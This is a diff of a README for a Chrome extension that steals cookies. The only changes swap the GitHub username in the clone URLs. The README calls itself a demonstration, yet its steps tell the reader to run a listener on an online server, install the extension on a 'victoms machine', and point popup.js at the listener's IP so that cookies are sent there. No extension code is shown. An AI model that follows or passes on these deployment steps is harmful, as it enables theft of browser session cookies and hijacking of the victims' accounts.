@@ -5,7 +5,7 @@ This plugin is a demonstration to show you how a hacker can steal your all cooki
 
 A - create VPS or any online server and open terminal
 
-1 - `git clone https://github.com/fluxx03/cookie_Stealing_chrome_extention.git`
+1 - `git clone https://github.com/fluxxset/cookie_Stealing_chrome_extention.git`
 
 
 2 - `cd cookie_Stealing_chrome_extention`
@@ -20,12 +20,12 @@ A - create VPS or any online server and open terminal
 
 B - go to your local computer or victoms machine / computer 
 
-1 - download zip file from https://github.com/fluxx03/cookie_Stealing_chrome_extention
+1 - download zip file from https://github.com/fluxxset/cookie_Stealing_chrome_extention
 
 
   or clone using git 
     
-    `git clone https://github.com/fluxx03/cookie_Stealing_chrome_extention.git`
+    `git clone https://github.com/fluxxset/cookie_Stealing_chrome_extention.git`
     
     
 2 - open popup.js file in plugin folder and add your listerner server ip insted 0.0.0.0
